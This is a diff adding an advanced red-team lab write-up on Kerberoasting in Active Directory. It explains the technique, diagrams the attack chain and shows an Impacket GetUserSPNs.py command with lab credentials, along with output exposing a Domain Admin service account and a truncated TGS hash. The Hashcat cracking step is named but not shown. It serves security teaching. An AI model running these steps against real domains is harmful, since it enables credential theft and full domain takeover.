@@ -1,0 +1,52 @@
+**Author:** Bhavishya | **Version:** 1.0 | **Subject:** Network & AD Exploitation
+**Level:** 600 (Advanced / Red Team)
+
+---
+
+## 🔬 Technical Deep Dive & Theory
+
+Active Directory uses Kerberos for authentication. When a user wants to access a service (like an SQL server), they request a **Ticket Granting Service (TGS)** from the Domain Controller. 
+
+**The Cryptographic Flaw:**
+The Domain Controller encrypts this TGS ticket using the NTLM password hash of the *Service Account* running that specific service. Because any authenticated user in the domain can request a TGS for any Service Principal Name (SPN), an attacker can request these tickets, export them, and crack the encryption offline. If the service account has a weak password, the attacker recovers the plaintext password. Since Service Accounts often have excessive privileges (sometimes Domain Admin), this leads to full domain compromise.
+
+---
+
+## 🗺️ Visualizing the Attack Chain
+
+### 🕵️ The Logic Flow
+```text
+Phase 1: The Extraction (Stealthy)
+[ 👤 Attacker (Low Priv) ] --> Asks DC for SQL Service Ticket  --> [ 🏰 Domain Controller ]
+[ 🏰 Domain Controller ]   --> Encrypts ticket with SQL Hash   --> [ 👤 Attacker ]
+[ 👤 Attacker ]            --> Saves encrypted ticket to disk  --> [ 📄 hashes.txt ]
+
+Phase 2: The Crack (Offline)
+[ 📄 hashes.txt ]          --> Loaded into GPU / Hashcat       --> [ 💻 Attacker Host ]
+[ 💻 Attacker Host ]       --> Brute-forces RC4 encryption     --> [ 🔓 Plaintext Password ]
+
+💻 Lab: The "Dirty Hands" Execution
+🎯 Objective
+Leverage a low-privilege domain foothold to query the Domain Controller for vulnerable Service Principal Names (SPNs), extract the encrypted Kerberos ticket, and crack it offline using Hashcat.
+
+🧰 The Attack Tools
+Impacket (GetUserSPNs.py): To query AD and request the TGS.
+
+Hashcat: To crack the RC4 encrypted ticket (Mode: 13100).
+
+🩸 Raw Output & Logs (The Breach)
+1. Extracting the Hash from the DC:
+```
+➜ GetUserSPNs.py target.local/bhavishya:Password123! -dc-ip 10.10.10.100 -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName                 Name          MemberOf                                  PasswordLastSet             LastLogon                   Delegation 
+-----------------------------------  ------------  ----------------------------------------  --------------------------  --------------------------  ----------
+MSSQLSvc/sql01.target.local:1433     svc_sql       CN=Domain Admins,CN=Users,DC=target...    2018-05-12 11:22:33         2023-10-01 09:14:12         False
+
+[*] Saving ticket in hashes.txt
+$krb5tgs$23$*svc_sql$TARGET.LOCAL$target.local/svc_sql*$6f8c...<TRUNCATED>...
+
+```
+
+
